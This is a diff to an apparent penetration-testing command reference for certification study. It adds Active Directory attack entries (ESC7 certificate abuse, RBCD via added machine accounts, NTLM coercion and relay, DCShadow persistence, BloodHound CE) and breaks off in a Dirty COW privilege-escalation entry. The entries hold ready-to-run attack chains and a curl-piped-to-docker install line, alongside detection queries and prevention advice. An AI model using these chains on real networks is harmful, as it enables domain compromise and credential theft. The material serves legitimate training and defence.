@@ -5150,6 +5150,107 @@ const COMMAND_DATA = {
       }
     },
     {
+      "id": "ad-adcs-esc7-ca-officer",
+      "name": "ADCS ESC7 - CA Officer / ManageCA Abuse",
+      "command": "certipy ca -ca <ca_name> -add-officer <user> -u <user>@<domain> -p <pass>",
+      "description": "ESC7 exploits ManageCA or ManageCertificates permissions on the CA server. With ManageCA, you can add yourself as a CA Officer and enable the SAN (Subject Alternative Name) flag on templates. With ManageCertificates (Certificate Officer), you can approve pending certificate requests. Combined, these enable requesting certs as any user.",
+      "platform": "linux",
+      "type": "attack-chain",
+      "opsec": "moderate",
+      "category": "Active Directory",
+      "subcategory": "ADCS Abuse",
+      "certifications": [
+        "CRTP",
+        "CPTS"
+      ],
+      "primary_cert": "CRTP",
+      "source": "SpecterOps Certified Pre-Owned; Certipy",
+      "tags": [
+        "adcs",
+        "esc7",
+        "manage-ca",
+        "ca-officer",
+        "certificate-template",
+        "san-flag"
+      ],
+      "mitre": [
+        "T1649"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== CONDITIONS ===\nYou have ManageCA or ManageCertificates permission on the CA.\n\n=== STEP 1: ADD YOURSELF AS OFFICER ===\n  certipy ca -ca <ca_name> -add-officer <user> -u <user>@<domain> -p <pass>\n\n=== STEP 2: ENABLE SUBJECTALTNAME FLAG ===\n  certipy ca -ca <ca_name> -enable-template SubCA -u <user>@<domain> -p <pass>\n  # Or enable SAN on an existing template\n\n=== STEP 3: REQUEST CERT WITH SAN ===\n  certipy req -u <user>@<domain> -p <pass> -ca <ca_name> -template SubCA -upn administrator@<domain>\n  # Request will be pending (needs officer approval)\n\n=== STEP 4: APPROVE AS OFFICER ===\n  certipy ca -ca <ca_name> -issue-request <request_id> -u <user>@<domain> -p <pass>\n\n=== STEP 5: RETRIEVE AND AUTH ===\n  certipy req -u <user>@<domain> -p <pass> -ca <ca_name> -retrieve <request_id>\n  certipy auth -pfx administrator.pfx -dc-ip <dc_ip>\n\n=== ALTERNATIVE: ManageCertificates only ===\nIf you only have ManageCertificates, you can approve pending\nrequests but not add officers or enable SAN. Look for templates\nthat already allow SAN or have pending requests.",
+      "examples": [
+        {
+          "label": "Add yourself as CA Officer",
+          "command": "certipy ca -ca corp-CA -add-officer jdoe -u jdoe@corp.local -p Password123"
+        },
+        {
+          "label": "Request cert with admin SAN",
+          "command": "certipy req -u jdoe@corp.local -p Password123 -ca corp-CA -template SubCA -upn administrator@corp.local"
+        },
+        {
+          "label": "Approve pending request",
+          "command": "certipy ca -ca corp-CA -issue-request 123 -u jdoe@corp.local -p Password123"
+        }
+      ],
+      "references": [
+        {
+          "title": "SpecterOps - Certified Pre-Owned",
+          "url": "https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf"
+        },
+        {
+          "title": "Certipy ESC7",
+          "url": "https://github.com/ly4k/Certipy#esc7"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "ad-adcs-esc6-editf-flag",
+          "note": "ESC6 enables SAN globally; ESC7 uses officer permissions to enable it per-template.",
+          "rel": "alternative"
+        },
+        {
+          "id": "ad-forgecert",
+          "note": "ForgeCert for persistence after obtaining CA access via ESC7.",
+          "rel": "next"
+        }
+      ],
+      "defense": {
+        "why_it_works": "ManageCA permission grants control over the CA configuration, including adding Certificate Officers and enabling template flags. ManageCertificates permission allows approving certificate requests that would otherwise be pending.",
+        "prerequisites": "ManageCA or ManageCertificates permission on the ADCS CA server.",
+        "impact": "Domain admin compromise by issuing certificates with arbitrary SANs.",
+        "detection": "[MITRE T1649] CA configuration changes; new officer assignments; certificate approvals for templates that normally require admin.",
+        "artifacts": "CA audit logs showing officer addition; certificate request and approval events; Event 4886/4887.",
+        "splunk_spl": "index=windows source=\"CertificationAuthority\" (EventCode=4890 OR EventCode=4892)\n| table _time, EventCode, Message",
+        "elastic_kql": "event.code:(\"4890\" OR \"4892\") AND event.provider:\"CertificationAuthority\"",
+        "sentinel_kql": "SecurityEvent\n| where EventID in (4890, 4892)\n| project TimeGenerated, EventID, EventData",
+        "sigma_rules": "win_security_adcs_esc7_officer_abuse",
+        "prevention": "Restrict ManageCA and ManageCertificates permissions; enable CA audit logging; monitor officer changes; require manager approval for sensitive templates.",
+        "sources": [
+          "SpecterOps research",
+          "https://attack.mitre.org/techniques/T1649/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "ESC7 - CA Officer added or certificate issued by new officer",
+            "logic": "SecurityEvent\n| where EventID in (4890, 4892)\n| project TimeGenerated, EventID, EventData\n| extend Detail = tostring(EventData)",
+            "data_source": "windows-security",
+            "log_ids": [
+              "4890",
+              "4892"
+            ],
+            "attack": [
+              "T1649"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "Legitimate CA administration",
+            "tuning": "Baseline normal CA officer activities; alert on new officer assignments"
+          }
+        ]
+      }
+    },
+    {
       "id": "ad-adcs-esc9-no-security-extension",
       "name": "ADCS ESC9 - No Security Extension (CT_FLAG_NO_SECURITY_EXTENSION)",
       "command": "certipy req -u <user>@<domain> -p <pass> -ca <ca_name> -template <vuln_template> -dc-ip <dc_ip>",
@@ -5245,6 +5346,101 @@ const COMMAND_DATA = {
             "confidence": "high",
             "false_positives": "Legitimate UPN changes during account migrations",
             "tuning": "Narrow time window; alert on any UPN change to privileged account names"
+          }
+        ]
+      }
+    },
+    {
+      "id": "ad-addcomputer",
+      "name": "addcomputer.py - Add Machine Account to Domain",
+      "command": "python3 addcomputer.py -computer-name FAKE01$ -computer-pass Password123 -dc-ip <dc_ip> <domain>/<user>:<pass>",
+      "description": "Impackets addcomputer.py adds a machine account to the domain. By default, any domain user can add up to 10 computers (ms-DS-MachineAccountQuota). The created machine account is needed for RBCD attacks, relay attacks, and S4U2Self abuse where you need a computer account you control.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Active Directory",
+      "subcategory": "Lateral Movement",
+      "certifications": [
+        "CRTP",
+        "CPTS"
+      ],
+      "primary_cert": "CPTS",
+      "source": "Impacket/addcomputer.py; CPTS RBCD chain",
+      "tags": [
+        "addcomputer",
+        "impacket",
+        "machine-account",
+        "maq",
+        "rbcd",
+        "relay"
+      ],
+      "mitre": [
+        "T1136.002"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== THE IDEA ===\nms-DS-MachineAccountQuota (default: 10) allows any domain user\nto add up to 10 computer accounts. This is a prerequisite for\nRBCD attacks where you need a computer account you control.\n\n=== ADD MACHINE ACCOUNT ===\n  python3 addcomputer.py -computer-name FAKE01$ -computer-pass Password123 -dc-ip <dc_ip> <domain>/<user>:<pass>\n\n=== CHECK MAQ ===\n  # PowerShell:\n  Get-ADObject -Identity \"DC=<domain_short>,DC=local\" -Properties ms-DS-MachineAccountQuota\n  # ldapsearch:\n  ldapsearch -H ldap://<dc_ip> -D \"<user>@<domain>\" -w \"<pass>\" -b \"DC=<domain_short>,DC=local\" ms-DS-MachineAccountQuota\n\n=== USE IN RBCD CHAIN ===\n  # 1. Add machine account\n  python3 addcomputer.py -computer-name FAKE01$ -computer-pass Password123 <domain>/<user>:<pass>\n  # 2. Set RBCD delegation\n  python3 rbcd.py -delegate-from FAKE01$ -delegate-to <target>$ -action write <domain>/<user>:<pass>\n  # 3. Get ticket via S4U\n  python3 getST.py -spn cifs/<target>.<domain> -impersonate administrator <domain>/FAKE01$:Password123\n  # 4. Use ticket\n  export KRB5CCNAME=administrator.ccache\n  python3 psexec.py -k -no-pass <target>.<domain>\n\n=== POWERSHELL ALTERNATIVE ===\n  New-MachineAccount -MachineAccount FAKE01 -Password (ConvertTo-SecureString \"Password123\" -AsPlainText -Force)",
+      "examples": [
+        {
+          "label": "Add machine account to domain",
+          "command": "python3 addcomputer.py -computer-name FAKE01$ -computer-pass Password123 -dc-ip 192.168.1.10 corp.local/jdoe:Password123"
+        },
+        {
+          "label": "Check MachineAccountQuota",
+          "command": "ldapsearch -H ldap://192.168.1.10 -D \"jdoe@corp.local\" -w \"Password123\" -b \"DC=corp,DC=local\" ms-DS-MachineAccountQuota"
+        },
+        {
+          "label": "PowerShell - add machine account",
+          "command": "New-MachineAccount -MachineAccount FAKE01 -Password (ConvertTo-SecureString \"Password123\" -AsPlainText -Force)"
+        }
+      ],
+      "references": [
+        {
+          "title": "Impacket - addcomputer.py",
+          "url": "https://github.com/fortra/impacket"
+        },
+        {
+          "title": "MITRE T1136.002 - Create Account: Domain Account",
+          "url": "https://attack.mitre.org/techniques/T1136/002/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "ad-impacket-rbcd",
+          "note": "RBCD requires a controlled machine account - addcomputer creates one.",
+          "rel": "next"
+        }
+      ],
+      "defense": {
+        "why_it_works": "The ms-DS-MachineAccountQuota attribute (default 10) allows any authenticated user to add computer accounts to the domain. These accounts have SPNs and can be used for delegation attacks.",
+        "prerequisites": "Valid domain credentials; MachineAccountQuota > 0.",
+        "impact": "Enables RBCD attacks, Kerberos relay attacks, and S4U2Self impersonation by providing a controlled computer account.",
+        "detection": "[MITRE T1136.002] Event 4741 (computer account created) by non-admin users.",
+        "artifacts": "Event 4741 (computer account created); new computer object in AD with non-standard naming.",
+        "splunk_spl": "index=windows EventCode=4741\n| where NOT match(SubjectUserName, \"SYSTEM|admin\")\n| table _time, SubjectUserName, TargetUserName, TargetDomainName",
+        "elastic_kql": "event.code:\"4741\" AND NOT user.name:(\"SYSTEM\" OR \"*admin*\")",
+        "sentinel_kql": "SecurityEvent\n| where EventID == 4741\n| where SubjectUserName !in (\"SYSTEM\") and SubjectUserName !contains \"admin\"\n| project TimeGenerated, SubjectUserName, TargetUserName",
+        "sigma_rules": "win_security_machine_account_creation_non_admin",
+        "prevention": "Set ms-DS-MachineAccountQuota to 0; require admin approval for computer account creation; monitor Event 4741.",
+        "sources": [
+          "CPTS methodology",
+          "https://attack.mitre.org/techniques/T1136/002/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "Machine account creation by non-admin user",
+            "logic": "SecurityEvent\n| where EventID == 4741\n| where SubjectUserName !in (\"SYSTEM\", \"ANONYMOUS LOGON\")\n| where SubjectUserName !has \"admin\"\n| project TimeGenerated, SubjectUserName, TargetUserName, SubjectDomainName",
+            "data_source": "windows-security",
+            "log_ids": [
+              "4741"
+            ],
+            "attack": [
+              "T1136.002"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "Helpdesk staff joining workstations; SCCM deployments",
+            "tuning": "Whitelist known machine-join service accounts; alert on any non-standard computer creation"
           }
         ]
       }
@@ -15453,6 +15649,106 @@ const COMMAND_DATA = {
       "explain": "A set of raw Cypher queries you paste into the BloodHound CE Neo4j console to surface attack paths the GUI does not show by default:\n  MATCH (u:User {owned:true})   start from accounts you have already marked as owned\n  shortestPath(...->(t:Group {highvalue:true}))   the fewest hops to a high-value group (e.g. Domain Admins)\n  RETURN p                       render that path as a graph\nOther queries in the set list outbound control edges, Kerberoastable/AS-REP-roastable users, shadow-credential and RBCD opportunities, and DCSync principals - so you pick the next abuse from live graph data instead of guessing."
     },
     {
+      "id": "ad-bloodhound-ce",
+      "name": "BloodHound Community Edition (CE) - Modern AD Attack Path Mapping",
+      "command": "curl -L https://ghst.ly/getbhce | docker compose -f - up",
+      "description": "BloodHound Community Edition (CE) is the modern rewrite of BloodHound with a PostgreSQL backend (replacing Neo4j), REST API, improved UI, and built-in attack path analysis. It identifies AD/AzureAD privilege escalation paths, ACL abuse chains, and Tier-0 asset exposure. SharpHound or BloodHound.py collectors feed data into it.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Active Directory",
+      "subcategory": "Enumeration",
+      "certifications": [
+        "CRTP",
+        "CPTS"
+      ],
+      "primary_cert": "CPTS",
+      "source": "SpecterOps/BloodHound; CPTS AD methodology",
+      "tags": [
+        "bloodhound",
+        "bloodhound-ce",
+        "attack-paths",
+        "ad-enumeration",
+        "acl-abuse",
+        "specterops",
+        "sharphound"
+      ],
+      "mitre": [
+        "T1087.002",
+        "T1069.002"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== INSTALL BLOODHOUND CE ===\n  curl -L https://ghst.ly/getbhce | docker compose -f - up\n  # Access at http://localhost:8080\n  # Default creds shown in console output on first run\n\n=== COLLECT DATA ===\n  # SharpHound (Windows):\n  SharpHound.exe -c All --zipfilename bh_data.zip\n  # Or PowerShell:\n  Invoke-BloodHound -CollectionMethod All -ZipFileName bh_data.zip\n\n  # BloodHound.py (Linux):\n  bloodhound-python -u <user> -p <pass> -d <domain> -dc <dc_ip> -c All\n\n=== UPLOAD DATA ===\n  # Upload ZIP via the CE web UI or API\n\n=== KEY QUERIES ===\n  # Built-in attack paths:\n  - Shortest path to Domain Admin\n  - Kerberoastable users with admin paths\n  - Unconstrained delegation systems\n  - ADCS attack paths\n  - Azure/EntraID privilege escalation\n\n=== API USAGE ===\n  # BloodHound CE exposes a REST API:\n  curl http://localhost:8080/api/v2/available-domains -H \"Authorization: Bearer <token>\"\n\n=== LEGACY vs CE ===\n  Legacy: Neo4j + Electron app, Cypher queries\n  CE: PostgreSQL + Web UI, REST API, built-in analysis\n  Both use the same SharpHound/bloodhound-python collectors",
+      "examples": [
+        {
+          "label": "Start BloodHound CE with Docker",
+          "command": "curl -L https://ghst.ly/getbhce | docker compose -f - up"
+        },
+        {
+          "label": "Collect AD data with SharpHound",
+          "command": "SharpHound.exe -c All --zipfilename bh_data.zip"
+        },
+        {
+          "label": "Collect from Linux with bloodhound-python",
+          "command": "bloodhound-python -u jdoe -p Password123 -d corp.local -dc 192.168.1.10 -c All"
+        }
+      ],
+      "references": [
+        {
+          "title": "BloodHound CE - GitHub",
+          "url": "https://github.com/SpecterOps/BloodHound"
+        },
+        {
+          "title": "BloodHound Documentation",
+          "url": "https://support.bloodhoundenterprise.io/hc/en-us"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "ad-bloodhound-python",
+          "note": "bloodhound-python is the Linux collector for BloodHound CE.",
+          "rel": "prereq"
+        },
+        {
+          "id": "ad-neo4j-bloodhound",
+          "note": "Legacy BloodHound with Neo4j for custom Cypher queries.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "BloodHound maps Active Directory relationships (group memberships, ACLs, sessions, delegations) into a graph database and finds attack paths that are invisible to manual enumeration. It reveals multi-hop privilege escalation chains.",
+        "prerequisites": "Domain user credentials for data collection; Docker for BloodHound CE server.",
+        "impact": "Reveals all privilege escalation paths in the domain; identifies Tier-0 exposure and ACL abuse chains.",
+        "detection": "[MITRE T1087.002] SharpHound collection generates high-volume LDAP queries; unusual SamAccountName and groupMembership enumeration.",
+        "artifacts": "LDAP query logs showing full AD enumeration; SharpHound ZIP files; network connections to all domain controllers.",
+        "splunk_spl": "index=windows EventCode=4104 ScriptBlockText=\"*SharpHound*\" OR ScriptBlockText=\"*Invoke-BloodHound*\"\n| table _time, ComputerName, UserName, ScriptBlockText",
+        "elastic_kql": "event.code:\"4104\" AND powershell.file.script_block_text:(*SharpHound* OR *BloodHound*)",
+        "sentinel_kql": "SecurityEvent\n| where EventID == 4104\n| where CommandLine has \"SharpHound\" or CommandLine has \"BloodHound\"\n| project TimeGenerated, Computer, Account, CommandLine",
+        "sigma_rules": "posh_ps_sharphound_bloodhound_collection",
+        "prevention": "Detect and block SharpHound execution via AMSI/EDR; monitor for mass LDAP enumeration; restrict unnecessary LDAP read access; use honeypot accounts that trigger on enumeration.",
+        "sources": [
+          "SpecterOps",
+          "https://attack.mitre.org/techniques/T1087/002/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "SharpHound/BloodHound collection activity",
+            "logic": "union\n(SecurityEvent | where EventID == 4104 | where CommandLine has_any (\"SharpHound\", \"Invoke-BloodHound\")),\n(DeviceProcessEvents | where FileName =~ \"SharpHound.exe\" or ProcessCommandLine has \"SharpHound\")\n| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine",
+            "data_source": "defender-endpoint",
+            "attack": [
+              "T1087.002",
+              "T1069.002"
+            ],
+            "fidelity": "signature",
+            "confidence": "high",
+            "false_positives": "Authorized red team or security assessment activities",
+            "tuning": "Alert on any detection; whitelist only during authorized engagements"
+          }
+        ]
+      }
+    },
+    {
       "id": "ad-neo4j-bloodhound",
       "name": "BloodHound GUI - Start Neo4j and BloodHound",
       "command": "sudo neo4j start && bloodhound",
@@ -20590,6 +20886,113 @@ const COMMAND_DATA = {
         "T1027",
         "T1204"
       ]
+    },
+    {
+      "id": "ad-coercer-multi",
+      "name": "Coercer - Multi-Protocol NTLM Coercion Scanner",
+      "command": "python3 Coercer.py coerce -u <user> -p <pass> -d <domain> -t <dc_ip> -l <listener_ip>",
+      "description": "Coercer by p0dalirius is a Swiss-army knife for NTLM coercion. It scans for and exploits multiple coercion methods in one tool: MS-EFSR (PetitPotam), MS-RPRN (PrinterBug), MS-FSRVP (ShadowCoerce), MS-DFSNM (DFSCoerce), and 10+ more RPC interfaces. Run it in scan mode first to find which methods work, then coerce to trigger authentication.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "loud",
+      "category": "Active Directory",
+      "subcategory": "Coercion & Relay",
+      "certifications": [
+        "CRTP",
+        "CPTS"
+      ],
+      "primary_cert": "CRTP",
+      "source": "p0dalirius/Coercer; CRTP coercion module",
+      "tags": [
+        "coercer",
+        "ntlm-coercion",
+        "multi-protocol",
+        "petitpotam",
+        "printerbug",
+        "relay"
+      ],
+      "mitre": [
+        "T1187",
+        "T1557.001"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== INSTALL ===\n  pip3 install coercer\n  # Or: git clone https://github.com/p0dalirius/Coercer\n\n=== SCAN MODE (find working methods) ===\n  python3 Coercer.py scan -u <user> -p <pass> -d <domain> -t <dc_ip>\n  # Reports which RPC methods are available\n\n=== COERCE MODE (trigger auth) ===\n  python3 Coercer.py coerce -u <user> -p <pass> -d <domain> -t <dc_ip> -l <listener_ip>\n  # Triggers ALL working methods\n\n=== SPECIFIC METHOD ===\n  python3 Coercer.py coerce -u <user> -p <pass> -d <domain> -t <dc_ip> -l <listener_ip> --filter-method-name EfsRpcOpenFileRaw\n\n=== SUPPORTED PROTOCOLS ===\n  MS-EFSR (PetitPotam)\n  MS-RPRN (PrinterBug)\n  MS-FSRVP (ShadowCoerce)\n  MS-DFSNM (DFSCoerce)\n  MS-EVEN (EventLog)\n  MS-BKRP (BackupKey)\n  And 10+ more\n\n=== RELAY CHAIN ===\n  # Terminal 1: Start relay\n  ntlmrelayx.py -t ldap://<dc_ip> --delegate-access -smb2support\n  # Terminal 2: Coerce\n  python3 Coercer.py coerce -u <user> -p <pass> -d <domain> -t <target> -l <listener_ip>",
+      "examples": [
+        {
+          "label": "Scan for available coercion methods",
+          "command": "python3 Coercer.py scan -u jdoe -p Password123 -d corp.local -t 192.168.1.10"
+        },
+        {
+          "label": "Coerce authentication from DC",
+          "command": "python3 Coercer.py coerce -u jdoe -p Password123 -d corp.local -t 192.168.1.10 -l 192.168.1.50"
+        },
+        {
+          "label": "Use specific method only",
+          "command": "python3 Coercer.py coerce -u jdoe -p Password123 -d corp.local -t 192.168.1.10 -l 192.168.1.50 --filter-method-name EfsRpcOpenFileRaw"
+        }
+      ],
+      "references": [
+        {
+          "title": "Coercer - GitHub",
+          "url": "https://github.com/p0dalirius/Coercer"
+        },
+        {
+          "title": "MITRE T1187 - Forced Authentication",
+          "url": "https://attack.mitre.org/techniques/T1187/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "ad-petitpotam",
+          "note": "PetitPotam is one of the methods Coercer wraps.",
+          "rel": "alternative"
+        },
+        {
+          "id": "ad-dfscoerce",
+          "note": "DFSCoerce is another method Coercer includes.",
+          "rel": "alternative"
+        },
+        {
+          "id": "smb-ntlm-relay",
+          "note": "Relay the coerced auth to LDAP/ADCS for domain compromise.",
+          "rel": "next"
+        }
+      ],
+      "defense": {
+        "why_it_works": "Multiple Windows RPC services can be abused to trigger NTLM authentication callbacks. Coercer tests all known methods systematically, increasing the chance of finding an exploitable coercion path.",
+        "prerequisites": "Valid domain credentials; network access to target RPC services (TCP 445).",
+        "impact": "Domain compromise when coerced authentication is relayed to ADCS or LDAP.",
+        "detection": "[MITRE T1187] Multiple RPC connection attempts to different service pipes; NTLM authentication from unexpected machine accounts.",
+        "artifacts": "Event 4624 (Type 3) from unexpected sources; named pipe access events; RPC connection logs.",
+        "splunk_spl": "index=sysmon EventCode=18 PipeName IN (\"\\\\*\\pipe\\efsrpc\", \"\\\\*\\pipe\\spoolss\", \"\\\\*\\pipe\\FssagentRpc\", \"\\\\*\\pipe\\netdfs\")\n| stats dc(PipeName) as unique_pipes by Image, SourceIp\n| where unique_pipes > 2",
+        "elastic_kql": "event.code:\"18\" AND file.name:(\"efsrpc\" OR \"spoolss\" OR \"FssagentRpc\" OR \"netdfs\")",
+        "sentinel_kql": "SysmonEvent\n| where EventID == 18\n| where PipeName in (\"\\\\*\\\\pipe\\\\efsrpc\", \"\\\\*\\\\pipe\\\\spoolss\", \"\\\\*\\\\pipe\\\\FssagentRpc\")\n| summarize PipeCount=dcount(PipeName) by SourceIp\n| where PipeCount > 2",
+        "sigma_rules": "sysmon_named_pipe_coercion_multi_protocol",
+        "prevention": "Disable unnecessary RPC services; enforce SMB signing; enable EPA on ADCS; restrict NTLM authentication; monitor for coercion patterns.",
+        "sources": [
+          "CRTP coercion module",
+          "https://attack.mitre.org/techniques/T1187/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "Multi-protocol NTLM coercion attempt",
+            "logic": "SysmonEvent\n| where EventID == 18\n| where PipeName has_any (\"efsrpc\", \"spoolss\", \"FssagentRpc\", \"netdfs\", \"eventlog\")\n| summarize UniquePipes=dcount(PipeName), TotalAttempts=count() by SourceIp, bin(TimeGenerated, 5m)\n| where UniquePipes >= 2",
+            "data_source": "sysmon",
+            "log_ids": [
+              "18"
+            ],
+            "attack": [
+              "T1187",
+              "T1557.001"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "Legitimate RPC operations to multiple services",
+            "tuning": "Alert on 2+ different coercion pipes from the same source in a short window"
+          }
+        ]
+      }
     },
     {
       "id": "cdsa-m06-coercing-unconstrained-delegation",
@@ -31122,6 +31525,101 @@ const COMMAND_DATA = {
       }
     },
     {
+      "id": "ad-dcshadow",
+      "name": "DCShadow - Rogue Domain Controller Persistence",
+      "command": "mimikatz# lsadump::dcshadow /object:TargetUser /attribute:primaryGroupID /value:512",
+      "description": "DCShadow registers a rogue domain controller in AD and pushes malicious replication changes (like adding a user to Domain Admins) through normal DC-to-DC replication. Changes made via DCShadow bypass most SIEM detections because they appear as legitimate replication events. Requires DA-level access - this is a persistence technique, not initial access.",
+      "platform": "windows",
+      "type": "command",
+      "opsec": "quiet",
+      "category": "Active Directory",
+      "subcategory": "Domain Persistence",
+      "certifications": [
+        "CRTP",
+        "CPTS"
+      ],
+      "primary_cert": "CRTP",
+      "source": "CRTP persistence module; Delpy/mimikatz",
+      "tags": [
+        "dcshadow",
+        "rogue-dc",
+        "persistence",
+        "replication",
+        "mimikatz",
+        "stealthy"
+      ],
+      "mitre": [
+        "T1207"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== THE IDEA ===\nDCShadow temporarily registers the attacker machine as a DC in AD.\nIt then pushes changes via normal DRS replication protocol.\nAfter the change replicates, the rogue DC is deregistered.\n\n=== REQUIRES ===\n- Domain Admin or Enterprise Admin privileges\n- Two mimikatz instances running simultaneously\n\n=== STEP 1: SET UP CHANGES (Terminal 1 - SYSTEM) ===\n  mimikatz# lsadump::dcshadow /object:TargetUser /attribute:primaryGroupID /value:512\n  # 512 = Domain Admins\n\n=== STEP 2: PUSH REPLICATION (Terminal 2 - DA) ===\n  mimikatz# lsadump::dcshadow /push\n  # This triggers replication from the rogue DC\n\n=== WHAT YOU CAN CHANGE ===\n- Add user to Domain Admins (primaryGroupID=512)\n- Modify SIDHistory for cross-domain persistence\n- Set SPN for Kerberoasting targets\n- Modify ACLs for persistent access\n- Push any LDAP attribute change\n\n=== WHY ITS STEALTHY ===\nChanges come through DRS replication, which is:\n- Expected traffic between DCs\n- Not logged by standard security events\n- Appears as normal AD replication\nOnly the temporary SPN registration is detectable.",
+      "examples": [
+        {
+          "label": "Add user to Domain Admins via DCShadow",
+          "command": "mimikatz# lsadump::dcshadow /object:TargetUser /attribute:primaryGroupID /value:512"
+        },
+        {
+          "label": "Push the replication changes",
+          "command": "mimikatz# lsadump::dcshadow /push"
+        },
+        {
+          "label": "Set SIDHistory for cross-domain persistence",
+          "command": "mimikatz# lsadump::dcshadow /object:TargetUser /attribute:SIDHistory /value:S-1-5-21-...-519"
+        }
+      ],
+      "references": [
+        {
+          "title": "MITRE T1207 - Rogue Domain Controller",
+          "url": "https://attack.mitre.org/techniques/T1207/"
+        },
+        {
+          "title": "DCShadow - Luc Delvaux & Benjamin Delpy",
+          "url": "https://www.dcshadow.com/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "crtp-adminsdholder",
+          "note": "AdminSDHolder is another stealthy persistence technique.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "AD replication (DRS) is a trusted mechanism between DCs. By temporarily registering as a DC, changes are pushed through the same channel legitimate DCs use, bypassing most change-detection systems that monitor LDAP modifications.",
+        "prerequisites": "Domain Admin privileges; ability to run two mimikatz processes simultaneously.",
+        "impact": "Stealthy persistent access; any AD attribute can be modified without generating standard change events.",
+        "detection": "[MITRE T1207] New DC SPN registration (temporary); replication from non-DC IP addresses; Event 4742 showing computer account SPN changes.",
+        "artifacts": "Temporary SPN registration (GC/ and E3514235-...) on a non-DC computer; Directory Service replication metadata from unknown source.",
+        "splunk_spl": "index=windows EventCode=4742\n| where ServicePrincipalNames=\"*GC/*\" OR ServicePrincipalNames=\"*E3514235-*\"\n| where NOT match(TargetUserName, \"DC\\d+\\$\")\n| table _time, TargetUserName, ServicePrincipalNames, SubjectUserName",
+        "elastic_kql": "event.code:\"4742\" AND winlog.event_data.ServicePrincipalNames:(*GC* OR *E3514235*)",
+        "sentinel_kql": "SecurityEvent\n| where EventID == 4742\n| where ServicePrincipalNames has \"GC/\" or ServicePrincipalNames has \"E3514235-\"\n| where TargetUserName !startswith \"DC\"\n| project TimeGenerated, TargetUserName, ServicePrincipalNames, SubjectUserName",
+        "sigma_rules": "win_security_dcshadow_spn_registration",
+        "prevention": "Monitor for DC SPN registration on non-DC computers; use AD replication metadata monitoring; restrict Domain Admin usage; implement Privileged Access Workstations.",
+        "sources": [
+          "CRTP persistence module",
+          "https://attack.mitre.org/techniques/T1207/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "DCShadow - Rogue DC SPN registration",
+            "logic": "SecurityEvent\n| where EventID == 4742\n| where ServicePrincipalNames has \"GC/\" or ServicePrincipalNames has \"E3514235-4B06-11D1-AB04-00C04FC2DCD2\"\n| join kind=anti (\n    SecurityEvent | where EventID == 4742 | where TargetUserName in (\"DC01$\", \"DC02$\")\n) on TargetUserName\n| project TimeGenerated, TargetUserName, ServicePrincipalNames, SubjectUserName",
+            "data_source": "windows-security",
+            "log_ids": [
+              "4742"
+            ],
+            "attack": [
+              "T1207"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "Legitimate DC promotion; DVDC (domain controller VMs being promoted)",
+            "tuning": "Whitelist known DC computer accounts; alert on any non-DC getting replication SPNs"
+          }
+        ]
+      }
+    },
+    {
       "id": "crtp-dcsync",
       "name": "DCSync (SafetyKatz / impacket-secretsdump)",
       "command": "SafetyKatz.exe \"lsadump::dcsync /user:<domain>\\krbtgt\" \"exit\"",
@@ -32676,6 +33174,106 @@ const COMMAND_DATA = {
         }
       },
       "explain": "Read arbitrary files outside the web root by injecting ../ sequences into a path parameter - distinct from LFI in that the file is disclosed, not executed.:\n  <ip>  target IP address\nDirectory traversal DISCLOSES files (read); LFI EXECUTES included files."
+    },
+    {
+      "id": "linux-dirtycow",
+      "name": "Dirty COW (CVE-2016-5195) - Kernel Race Condition Privesc",
+      "command": "gcc -pthread dirty.c -o dirty -lcrypt && ./dirty <new_password>",
+      "description": "Dirty COW (Copy-On-Write) is a race condition in the Linux kernel memory subsystem that allows writing to read-only memory mappings. It affects kernels 2.x through 4.x (patched in 4.8.3). The most reliable variants overwrite /etc/passwd to add a root user or replace SUID binaries. Still commonly found on older/unpatched systems and CTF boxes.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "loud",
+      "category": "Post-Exploitation",
+      "subcategory": "Privilege Escalation",
+      "certifications": [
+        "OSCP"
+      ],
+      "primary_cert": "OSCP",
+      "source": "CVE-2016-5195; dirtycow.ninja",
+      "tags": [
+        "dirtycow",
+        "dirty-cow",
+        "cve-2016-5195",
+        "kernel-exploit",
+        "race-condition",
+        "copy-on-write"
+      ],
+      "mitre": [
+        "T1068"
+      ],
+      "exam": "exam-ok",
